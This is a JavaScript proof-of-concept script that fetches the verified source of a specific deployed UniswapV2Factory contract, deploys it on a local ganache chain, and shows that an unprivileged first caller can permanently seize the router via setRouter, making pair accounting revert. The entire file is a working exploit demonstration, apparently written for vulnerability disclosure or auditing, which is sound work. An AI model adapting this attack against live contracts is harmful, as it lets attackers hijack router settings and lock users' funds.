const assert = require('node:assert/strict');
const ganache = require('ganache');
const solc = require('solc');
const { BrowserProvider, ContractFactory } = require('ethers');

const FACTORY = '0xf028f723ed1d0fe01cc59973c49298aa95c57472';
const SOURCE_API = `https://eth.blockscout.com/api/v2/smart-contracts/${FACTORY}`;

async function main() {
  const response = await fetch(SOURCE_API);
  assert.equal(response.ok, true, `Blockscout source request failed: ${response.status}`);
  const verified = await response.json();
  assert.equal(verified.name, 'UniswapV2Factory');
  assert.match(verified.source_code, /function setRouter\(address router\) external/);

  const input = {
    language: 'Solidity',
    sources: { 'UniswapV2Factory.sol': { content: verified.source_code } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const compiled = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (compiled.errors || []).filter((entry) => entry.severity === 'error');
  assert.deepEqual(errors, [], errors.map((entry) => entry.formattedMessage).join('\n'));
  const factoryArtifact = compiled.contracts['UniswapV2Factory.sol'].UniswapV2Factory;

  const eip1193 = ganache.provider({ logging: { quiet: true }, chain: { hardfork: 'istanbul' } });
  try {
    const provider = new BrowserProvider(eip1193);
    const deployer = await provider.getSigner(0);
    const attacker = await provider.getSigner(1);
    const intendedRouter = await provider.getSigner(2);
    const attackerAddress = await attacker.getAddress();
    const intendedRouterAddress = await intendedRouter.getAddress();

    const factory = await new ContractFactory(
      factoryArtifact.abi,
      `0x${factoryArtifact.evm.bytecode.object}`,
      deployer,
    ).deploy(await deployer.getAddress());
    await factory.waitForDeployment();

    await (await factory.connect(attacker).setRouter(attackerAddress)).wait();
    await assert.rejects(factory.connect(deployer).setRouter(intendedRouterAddress));

    const tokenA = '0x0000000000000000000000000000000000000001';
    const tokenB = '0x0000000000000000000000000000000000000002';
    const tx = await factory.createPair(tokenA, tokenB);
    await tx.wait();
    const pairAddress = await factory.getPair(tokenA, tokenB);
    const pair = new (require('ethers').Contract)(pairAddress, [
      'function router() view returns (address)',
      'function sync()',
    ], provider);

    assert.equal((await factory.feeToSetter()).toLowerCase(), (await deployer.getAddress()).toLowerCase());
    assert.equal((await pair.router()).toLowerCase(), attackerAddress.toLowerCase());
    await assert.rejects(pair.sync());
    console.log('PASS: an unprivileged first caller permanently selects the router and the bound EOA makes pair accounting revert.');
    console.log(`Factory: ${await factory.getAddress()}`);
    console.log(`Attacker-selected router: ${await pair.router()}`);
    console.log(`Intended router rejected: ${intendedRouterAddress}`);
  } finally {
    await eip1193.disconnect();
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
